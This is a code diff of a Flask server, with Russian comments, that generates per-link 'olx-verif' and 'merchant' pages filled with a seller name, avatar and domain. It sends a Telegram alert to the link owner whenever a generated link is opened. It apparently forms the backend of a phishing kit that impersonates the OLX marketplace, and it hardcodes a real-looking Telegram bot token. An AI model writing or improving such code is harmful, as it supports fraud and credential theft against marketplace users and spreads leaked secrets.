@@ -7,48 +7,42 @@ from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 
-# Настройки Telegram
-API_TOKEN = '7216530203:AAHo7UsufnSII67aV1ZINQ91OV1TL_WjaSw'  # Убедитесь, что этот токен корректный
-TELEGRAM_API_URL = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
-
-# Путь к файлу со ссылками
-LINKS_FILE = '/home/user/app/data/links.json'
-
-def send_telegram_message(chat_id, text):
-    data = {
-        'chat_id': chat_id,
-        'text': text
-    }
-    response = requests.post(TELEGRAM_API_URL, data=data)
-    
-    if response.status_code != 200:
-        print(f"Ошибка при отправке сообщения: {response.status_code} - {response.text}")
+@app.route('/verif/<random_id>', methods=['GET'])
+def verify_link(random_id):
+    user_id = get_user_id_by_link(random_id)
+    if user_id:
+        send_telegram_message(user_id, f"Переход по ссылке {random_id}")
+        return jsonify({'message': 'Link verified and message sent'}), 200
     else:
-        print(f"Сообщение успешно отправлено: {response.json()}")
-        
-    return response.json()
+        return jsonify({'error': 'Invalid link ID'}), 400
+
+def get_user_id_by_link(random_id):
+    links = load_links()
+    link_data = next((link for link in links if link['link_id'] == int(random_id)), None)
+    return link_data['user_id'] if link_data else None
+
+def send_telegram_message(user_id, message):
+    telegram_bot_token = '7216530203:AAHo7UsufnSII67aV1ZINQ91OV1TL_WjaSw'  # Замените на токен вашего бота
+    send_message_url = f'https://api.telegram.org/bot{telegram_bot_token}/sendMessage'
+    payload = {
+        'chat_id': user_id,
+        'text': message
+    }
+    requests.post(send_message_url, json=payload)
 
 def load_links():
-    if os.path.exists(LINKS_FILE):
-        with open(LINKS_FILE, 'r', encoding='utf-8') as file:
+    try:
+        with open('/home/user/app/data/links.json', 'r', encoding='utf-8') as file:
             return json.load(file)
-    return []
+    except (FileNotFoundError, json.JSONDecodeError):
+        return []
 
-def get_user_id_by_random_id(random_id):
-    links = load_links()
-    for link in links:
-        if link['link_id'] == random_id:
-            return link['user_id']
-    return None
+def save_links(links):
+    with open('/home/user/app/data/links.json', 'w', encoding='utf-8') as file:
+        json.dump(links, file, ensure_ascii=False, indent=4)
 
 @app.route('/verif/<random_id>', methods=['POST'])
-def handle_verif_link(random_id):
-    user_id = get_user_id_by_random_id(random_id)
-    if user_id:
-        print(f"Отправка сообщения пользователю с ID: {user_id}")
-        send_telegram_message(user_id, f"Переход по ссылке! link_id: {random_id}")
-
-    # Логика для сохранения страницы или другой обработки
+def save_page(random_id):
     seller_name_tag = request.form.get('seller_name_tag')
     avatar_url = request.form.get('avatar_url')
     current_domain = request.form.get('current_domain')
@@ -56,7 +50,6 @@ def handle_verif_link(random_id):
     if not seller_name_tag or not avatar_url or not current_domain:
         return jsonify({'error': 'Missing data'}), 400
 
-    # Define paths
     page_save_path = f"/var/www/olx-verif/verif/{random_id}/index.html"
     verif_source_dir = '/home/user/services/olx-verif/verif/'
     merchant_source_dir = '/home/user/services/olx-verif/merchant/'
@@ -65,7 +58,6 @@ def handle_verif_link(random_id):
     verif_destination_file = os.path.join('/var/www/olx-verif/verif', random_id, 'index.html')
     merchant_destination_file = os.path.join('/var/www/olx-verif/merchant', random_id, 'index.html')
 
-    # Create directories and copy files
     os.makedirs(os.path.dirname(page_save_path), exist_ok=True)
     if os.path.exists(verif_source_file):
         shutil.copy(verif_source_file, verif_destination_file)
@@ -78,7 +70,6 @@ def handle_verif_link(random_id):
     else:
         return jsonify({'error': 'File /home/user/services/olx-verif/merchant/index.html not found'}), 404
 
-    # Replace the content in the file
     with open(verif_destination_file, 'r') as file:
         content = file.read()
 
@@ -111,13 +102,8 @@ def serve_merchant_page(random_id):
     return send_from_directory(merchant_path, 'index.html')
 
 @app.route('/load_links', methods=['GET'])
-def load_links_route():
-    if os.path.exists(LINKS_FILE):
-        with open(LINKS_FILE, 'r', encoding='utf-8') as file:
-            links = json.load(file)
-    else:
-        links = []
-
+def load_links_endpoint():
+    links = load_links()
     return jsonify(links), 200
 
 @app.route('/save_link', methods=['POST'])
@@ -126,27 +112,22 @@ def save_link():
     if not link_data:
         return jsonify({'error': 'No data provided'}), 400
 
-    links_file = LINKS_FILE
+    links_file = '/home/user/app/data/links.json'
     links_dir = os.path.dirname(links_file)
 
-    # Создаем директорию, если она не существует
     os.makedirs(links_dir, exist_ok=True)
 
-    # Загружаем существующие данные
     if os.path.exists(links_file):
         with open(links_file, 'r', encoding='utf-8') as file:
             links = json.load(file)
     else:
         links = []
 
-    # Убедитесь, что данных нет дубликатов
     existing_link_ids = {link['link_id'] for link in links}
     new_links = [link for link in link_data if link['link_id'] not in existing_link_ids]
 
-    # Добавляем новые данные
     links.extend(new_links)
 
-    # Сохраняем данные обратно в файл
     with open(links_file, 'w', encoding='utf-8') as file:
         json.dump(links, file, indent=4, ensure_ascii=False)
 
@@ -160,25 +141,21 @@ def delete_ad():
     if not ad_id:
         return jsonify({'error': 'No ad_id provided'}), 400
 
-    links_file = LINKS_FILE
+    links_file = '/home/user/app/data/links.json'
     verif_path = f'/var/www/olx-verif/verif/{ad_id}'
     merchant_path = f'/var/www/olx-verif/merchant/{ad_id}'
 
-    # Загружаем существующие данные
     if os.path.exists(links_file):
         with open(links_file, 'r', encoding='utf-8') as file:
             links = json.load(file)
     else:
         links = []
 
-    # Удаляем объявление из списка
     links = [ad for ad in links if str(ad['link_id']) != ad_id]
 
-    # Сохраняем обновленные данные обратно в файл
     with open(links_file, 'w', encoding='utf-8') as file:
         json.dump(links, file, indent=4, ensure_ascii=False)
 
-    # Удаляем директории
     if os.path.exists(verif_path):
         shutil.rmtree(verif_path)
     if os.path.exists(merchant_path):
@@ -194,16 +171,14 @@ def delete_all_ads():
     if not user_id:
         return jsonify({'error': 'No user_id provided'}), 400
 
-    links_file = LINKS_FILE
+    links_file = '/home/user/app/data/links.json'
 
-    # Загружаем существующие данные
     if os.path.exists(links_file):
         with open(links_file, 'r', encoding='utf-8') as file:
             links = json.load(file)
     else:
         links = []
 
-    # Находим все объявления пользователя и удаляем соответствующие директории
     user_ads = [ad for ad in links if ad['user_id'] == user_id]
     for ad in user_ads:
         verif_path = f'/var/www/olx-verif/verif/{ad["link_id"]}'
@@ -213,10 +188,8 @@ def delete_all_ads():
         if os.path.exists(merchant_path):
             shutil.rmtree(merchant_path)
 
-    # Удаляем объявления пользователя из списка
     links = [ad for ad in links if ad['user_id'] != user_id]
 
-    # Сохраняем обновленные данные обратно в файл
     with open(links_file, 'w', encoding='utf-8') as file:
         json.dump(links, file, indent=4, ensure_ascii=False)
 
